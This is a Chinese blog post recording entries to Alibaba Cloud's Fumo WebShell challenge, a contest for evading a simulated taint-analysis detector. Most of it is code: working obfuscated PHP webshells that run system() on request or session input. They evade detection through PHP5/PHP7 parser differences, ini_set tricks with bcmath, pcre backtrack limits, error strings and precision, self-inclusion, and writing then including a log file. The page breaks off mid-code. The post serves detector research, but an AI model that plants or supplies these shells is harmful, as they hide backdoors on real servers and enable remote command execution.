<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>第四届阿里云伏魔挑战赛PHP WebShell记录 - LionTree</title>
  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=>
  
  
  
    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">LionTree</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/summary" class="menu-item-link">Summary</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
        <li class="menu-item">
          <a href="/atom.xml" class="menu-item-link">RSS</a>
        </li>
      
    </ul>
  </nav>
</header>

<article class="post">
  <div class="post-title">
    <h1 class="article-title">第四届阿里云伏魔挑战赛PHP WebShell记录</h1>
  </div>

  <!-- 文章目录 -->
  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">动态函数调用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Parser"><span class="toc-text">Parser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ini-set"><span class="toc-text">ini_set</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#包含自身"><span class="toc-text">包含自身</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写文件后包含"><span class="toc-text">写文件后包含</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">控制流</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">其他</span></a></li></ol>

  <div class="post-content">
    <p>前段时间参与了下阿里云的伏魔webshell挑战赛，记录下PHP的一些思路。</p>
<p>伏魔对webshell的检测主要基于模拟污点引擎，虽然介绍中也提到了AI检测和动态沙箱执行检测等其他手段，但测试中感知并不强。模拟污点引擎也是一个类似zend的虚拟机，对AST进行解释执行，从而在比较精确地获取变量值和函数调用链的同时规避动态沙箱对环境依赖及版本碎片化等问题，原理可以参考<a href="https://ti.aliyun.com/#/log?id=3" target="_blank" rel="noopener">WebShell检测之「模拟污点引擎」首次公测，邀你来战！</a>和<a href="https://ti.aliyun.com/#/log?id=27" target="_blank" rel="noopener">模拟执行在恶意文本检测中的最佳实践</a>。</p>
<h1>动态函数调用</h1>
<p>动态调用是PHP webshell最常利用的特性，首先来测试下针对动态调用的检测规则：</p>
<p>以<code>$a($b)</code>调用<code>system</code>命令执行为例</p>
<ul>
<li><code>$b</code>明确为用户可控，此时<code>$a</code>在运行过程中的任意时刻（每行代码执行后）都不能包含<code>system</code>等敏感函数
<ul>
<li><code>$b</code>的值来自<code>file_get_contents</code>等返回值不确定的内置函数行为也是一样的</li>
<li>如果直接写成<code>$a($_GET['x'])</code>这种的话无论$a是啥都是black，估计是直接写了个正则</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line">$a = <span class="string">"aaasystembbb"</span>;</span><br><span class="line">$a = <span class="string">"xxxxxx"</span>;</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line">$a = <span class="string">"aaasys"</span>;</span><br><span class="line">$a .= <span class="string">"temxxx"</span>;</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line">$a = <span class="string">"aaasys"</span>;</span><br><span class="line">$a = <span class="string">"temxxx"</span>;</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>$b</code>为<code>&quot;whoami&quot;</code>等敏感命令，此时对<code>$a</code>的每次赋值不允许包含<code>&quot;system&quot;</code>，但拼接的话只要最终结果不为<code>&quot;system&quot;</code>即可</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line">$a = <span class="string">"system"</span>;</span><br><span class="line">$a = <span class="string">"wefwfw"</span>;</span><br><span class="line">$b = <span class="string">"whoami"</span>;</span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line">$a = <span class="string">"fwefsystemfwe"</span>;</span><br><span class="line">$a = <span class="string">"wefwfw"</span>;</span><br><span class="line">$b = <span class="string">"whoami"</span>;</span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line">$a = <span class="string">"aaasys"</span>;</span><br><span class="line">$a .= <span class="string">"temxxx"</span>;</span><br><span class="line">$b = <span class="string">"whoami"</span>;</span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line">$a = <span class="string">"fwefsystemfwe"</span>;</span><br><span class="line">$a .= <span class="string">"wefwfw"</span>;</span><br><span class="line">$b = <span class="string">"whoami"</span>;</span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>$b</code>为其他安全的常量，此时<code>$a</code>的值无所谓</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line">$a = <span class="string">"system"</span>;</span><br><span class="line">$b = <span class="string">"xxxx"</span>;</span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure>
<p>对于诸如 <code>file_get_contents()</code> 和 <code>phpinfo()</code> 这类返回值不确定的内置函数调用，其返回值会被视为污点值，待遇等同<code>&quot;system&quot;</code>字符串。因此，如果想利用动态函数调用，我们需要让引擎获取到一个它认为是确定的安全值，但实际上却是恶意值。</p>
<h2 id="Parser">Parser</h2>
<p>php5和php7的语法规则存在一定的差异，有一些语法是不兼容的。如果污点模拟引擎采用的parser只支持某个版本就会存在特定版本的绕过。基于这个思路我去查看了下最常见的<a href="https://github.com/nikic/PHP-Parser" target="_blank" rel="noopener">PHP-Parser</a>对php各版本的支持情况，即使伏魔使用的不是PHP-Parser也可能存在类似的问题（感觉用的应该是魔改版？）。</p>
<p>在<a href="https://github.com/nikic/PHP-Parser/blob/7d3039c37823003d576247868fe755f3d7ec70b8/doc/0_Introduction.markdown" target="_blank" rel="noopener">https://github.com/nikic/PHP-Parser/blob/7d3039c37823003d576247868fe755f3d7ec70b8/doc/0_Introduction.markdown</a> 中可以看到PHP-Parser在对于变量表达式的解析只支持PHP7的规则，测试发现伏魔同样存在这个问题，仅仅按照PHP7的方式进行了求值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="string">"system"</span>;</span><br><span class="line">$foo = <span class="string">"bar"</span>;</span><br><span class="line">$bar = [<span class="string">"fwefwe"</span>, <span class="string">"world"</span>];</span><br><span class="line"></span><br><span class="line">$c = <span class="string">"get_defined_vars"</span>;</span><br><span class="line">$foo2 = <span class="string">"car"</span>;</span><br><span class="line">$car = [<span class="string">"fwefwe"</span>, <span class="string">"world"</span>];</span><br><span class="line">$a = end(current(call_user_func($$foo2[<span class="number">0</span>])));</span><br><span class="line">call_user_func($$foo[<span class="number">0</span>], $a);</span><br></pre></td></tr></table></figure>
<p>在PHP7中<code>$$foo[0]</code>先获取了<code>$$foo</code>的值，然后再访问索引。PHP5中则是先获取了<code>$foo[0]</code>，最终获取了<code>$b</code>的值。</p>
<h2 id="ini-set">ini_set</h2>
<p>伏魔对能够精确求值的内置函数进行了建模（猜测应该是直接调用了这些内置函数进行求值？），但测试发现其中一些内置函数的行为没有考虑ini配置项的影响，通过<code>ini_set</code>可以构造出模拟执行和真实执行的差异。</p>
<ul>
<li>通过<code>ini_set('bcmath.scale', 4);</code>使得模拟执行引擎无法正确模拟<code>bcadd</code>的行为</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'bcmath.scale'</span>, <span class="number">4</span>);</span><br><span class="line">session_start();</span><br><span class="line">$result = bcadd(<span class="string">'1.234'</span>, <span class="string">'2.456'</span>); <span class="comment">// 输出: 3.6900</span></span><br><span class="line">$decimalPart = explode(<span class="string">'.'</span>, $result)[<span class="number">1</span>]; <span class="comment">// 分割字符串并获取小数部分</span></span><br><span class="line">$result2 = bcadd(<span class="string">'1.234'</span>, <span class="string">'2.012'</span>); <span class="comment">// 输出: 3.2460</span></span><br><span class="line">$decimalPart2 = explode(<span class="string">'.'</span>, $result2)[<span class="number">1</span>]; <span class="comment">// 分割字符串并获取小数部分</span></span><br><span class="line">$x = chr($decimalPart - <span class="number">6785</span>).chr($decimalPart2 - <span class="number">2339</span>).chr($decimalPart - <span class="number">6785</span>).chr($decimalPart - <span class="number">6784</span>).chr($decimalPart - <span class="number">6799</span>).chr($decimalPart - <span class="number">6791</span>);</span><br><span class="line">$y = chr($decimalPart - <span class="number">6785</span>).chr($decimalPart2 - <span class="number">2359</span>).str_repeat(chr($decimalPart - <span class="number">6785</span>),<span class="number">2</span>).<span class="string">"ion_id"</span>;</span><br><span class="line">$x($y());</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ini_set</code>动态将<code>zend.enable_gc</code>设置为0，影响<code>gc_enabled()</code>的返回值误导模拟执行引擎</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set($_GET[<span class="string">'a'</span>],<span class="number">0</span>);</span><br><span class="line">$a = var_export(gc_enabled(),<span class="keyword">true</span>)[<span class="number">0</span>];</span><br><span class="line">$b = gc_enabled();</span><br><span class="line">$t = <span class="string">"xxxx"</span>;</span><br><span class="line">$f = $_GET[<span class="string">'x'</span>];</span><br><span class="line">$x = <span class="string">"system"</span>.$b;</span><br><span class="line">$x($$a);</span><br></pre></td></tr></table></figure>
<ul>
<li>伏魔对输出缓冲区中的值也进行了精确的模拟，但没考虑到通过<code>error_append_string</code>可以在报错信息中包含<code>system</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="string">'1'</span>);</span><br><span class="line">ini_set(<span class="string">'error_reporting'</span>, E_ALL);</span><br><span class="line">ini_set(<span class="string">'error_append_string'</span>, <span class="string">'system'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"xxxx"</span>;</span><br><span class="line"><span class="comment">// 触发错误</span></span><br><span class="line"><span class="keyword">echo</span> $undefined_variable;</span><br><span class="line"></span><br><span class="line">$output = ob_get_clean();</span><br><span class="line"></span><br><span class="line">var_dump($output);</span><br><span class="line">substr($output, <span class="number">138</span>, <span class="number">6</span>)($_GET[<span class="string">'x'</span>]);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>arg_separator.output</code>其实是被考虑到了，但<code>ini_set($_GET['x'],&quot;st&quot;);</code>这样的形式没有被禁止，此时污点模拟引擎没有模拟出是哪个配置项被设置为了<code>&quot;st&quot;</code>
<ul>
<li>不过第一个参数为<code>$_GET['x']</code>时伏魔会去检查第二个参数是否可能是某个回调函数，因此像<code>unserialize_callback_func</code>没有办法用这种方式利用</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set($_GET[<span class="string">'x'</span>],<span class="string">"st"</span>);</span><br><span class="line">$a = http_build_query([<span class="string">'name'</span> =&gt; <span class="string">'sy'</span>, <span class="string">'em'</span> =&gt; <span class="number">0</span>]);</span><br><span class="line">substr($a,<span class="number">5</span>,<span class="number">6</span>)($_GET[<span class="string">'a'</span>]);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>precision</code>和<code>arg_separator.output</code>类似，需要用<code>$_GET['x']</code>来设置。这会影响<code>print_r</code>浮点数部分的结果，输出后再从缓冲区中取出。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set($_GET[<span class="string">'x'</span>],<span class="number">5</span>);</span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"></span><br><span class="line">ob_start(<span class="keyword">null</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"aaaaaaaa"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a"</span>;</span><br><span class="line"></span><br><span class="line">$buffer2 = ob_get_contents();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;继续输出内容。"</span>;</span><br><span class="line"></span><br><span class="line">ob_end_flush();</span><br><span class="line"></span><br><span class="line">ob_start(<span class="keyword">null</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"11111111"</span>;</span><br><span class="line">print_r(<span class="number">4323.9281</span>);</span><br><span class="line"></span><br><span class="line">$buffer3 = ob_get_contents();</span><br><span class="line"><span class="keyword">if</span> (is_numeric($buffer3)) &#123;</span><br><span class="line">    $floatValue = (float)$buffer3;</span><br><span class="line">    $decimalPart2 = ($floatValue - floor($floatValue))*<span class="number">10</span>; <span class="comment">// 获取小数部分</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $decimalPart2 = <span class="keyword">null</span>; <span class="comment">// 如果不是数字，则不能提取小数部分</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;继续输出内容。"</span>;</span><br><span class="line"></span><br><span class="line">ob_end_flush();</span><br><span class="line"></span><br><span class="line">ob_start(<span class="keyword">null</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"11111111"</span>;</span><br><span class="line">print_r(<span class="number">1000.3232</span>);</span><br><span class="line"></span><br><span class="line">$buffer = ob_get_contents();</span><br><span class="line"><span class="keyword">if</span> (is_numeric($buffer)) &#123;</span><br><span class="line">    $floatValue = (float)$buffer;</span><br><span class="line">    $decimalPart = ($floatValue - floor($floatValue))*<span class="number">10</span>; <span class="comment">// 获取小数部分</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $decimalPart = <span class="keyword">null</span>; <span class="comment">// 如果不是数字，则不能提取小数部分</span></span><br><span class="line">&#125;</span><br><span class="line">$x = chr($decimalPart + <span class="number">113</span>).<span class="string">"ys"</span>.chr($decimalPart2 + <span class="number">108</span>).chr($decimalPart + <span class="number">99</span>).chr($decimalPart + <span class="number">107</span>);</span><br><span class="line">$x($$buffer2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;继续输出内容。"</span>;</span><br><span class="line"></span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $decimalPart;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $decimalPart2;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $x;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>将pcre.backtrack_limit设置为较低的值，使得preg_match正则回溯超过限定次数，<code>$matches[2]</code>和<code>$matches[1]</code>为空。模拟执行引擎误以为两者为<code>aaa</code>和<code>testing</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"pcre.backtrack_limit"</span>, <span class="number">10</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$text = <span class="string">"aaatesting_GET"</span>.<span class="string">"system"</span>.str_repeat(<span class="string">"a"</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">$pattern = <span class="string">'/(aaa)(.*)(_GET)(system)/'</span>; </span><br><span class="line"></span><br><span class="line">$matches = <span class="string">"a"</span>;</span><br><span class="line">preg_match($pattern, $text, $matches);</span><br><span class="line">$x = $matches[<span class="number">2</span>];</span><br><span class="line">$y = $matches[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// print_r($matches);</span></span><br><span class="line">(<span class="string">"s"</span>.$x.<span class="string">"y"</span>.$x.<span class="string">"s"</span>.$x.<span class="string">"t"</span>.$x.<span class="string">"e"</span>.$x.<span class="string">"m"</span>)((<span class="string">"s"</span>.$x.<span class="string">"e"</span>.$x.<span class="string">"s"</span>.$x.<span class="string">"s"</span>.$x.<span class="string">"i"</span>.$x.<span class="string">"o"</span>.$x.<span class="string">"n"</span>.$x.<span class="string">"_"</span>.$x.<span class="string">"i"</span>.$x.<span class="string">"d"</span>)());</span><br><span class="line"><span class="comment">// echo $f;</span></span><br></pre></td></tr></table></figure>
<h1>文件包含</h1>
<p>相关的限制：</p>
<ul>
<li>对最终包含的路径值有一个类似<code>^\/tmp\/[\s\S]+$</code>的正则检测，符合的话就是black，不过并不严格，允许<code>/tmp</code>前出现<code>../</code>
<ul>
<li><code>include_path</code>也有类似限制</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"/tmp/fwefwf"</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"/tmp/"</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"../../../tmp/fwefw"</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line">ini_set(<span class="string">"include_path"</span>,<span class="string">"/tmp"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"afwefw"</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line">ini_set(<span class="string">"include_path"</span>,<span class="string">"../../../tmp"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"afwefw"</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>会检测<code>sess_</code>防止包含session文件</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"sess_fw"</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"/tmp/xxx/../sess_fw"</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"sessfw"</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// white</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"xsess_fw"</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>禁止包含<code>__FILE__</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// black</span></span><br><span class="line"><span class="keyword">include</span> <span class="keyword">__FILE__</span>;</span><br></pre></td></tr></table></figure>
<h2 id="包含自身">包含自身</h2>
<ul>
<li>尽管<code>__FILE__</code>被禁用，但仍然可以直接包含自身文件名制造出模拟执行和真实执行的差异</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$a++;</span><br><span class="line"><span class="keyword">if</span>($a &lt; <span class="number">115</span>)</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"./include.php"</span>; <span class="comment">// 假设文件名是 include.php</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    (chr($a).<span class="string">"ystem"</span>)((chr($a).<span class="string">"ession_id"</span>)());</span><br></pre></td></tr></table></figure>
<h2 id="写文件后包含">写文件后包含</h2>
<p>污点模拟引擎无法真实模拟文件的写入操作，因此如果能够实现一个内容可控的文件写入 WebShell，就可以包含写入的文件升级为一个完整的webshell。</p>
<ul>
<li>直接<code>error_log</code>…</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'log_errors'</span>, <span class="string">'On'</span>); </span><br><span class="line">ini_set(<span class="string">'error_log'</span>, <span class="string">'test.log'</span>); </span><br><span class="line"></span><br><span class="line">error_log($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'test.log'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>RecursiveDirectoryIterator</code>没有被禁，可以起到类似通配符的效果，直接包含文件上传的临时文件</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$directory = <span class="string">"/tmp"</span>;</span><br><span class="line"></span><br><span class="line">$iterator = <span class="keyword">new</span> RecursiveIteratorIterator(<span class="keyword">new</span> RecursiveDirectoryIterator($directory));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($iterator <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($file-&gt;isFile() &amp;&amp; strpos($file-&gt;getFilename(), <span class="string">'php'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">include_once</span> $file-&gt;getPathname(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 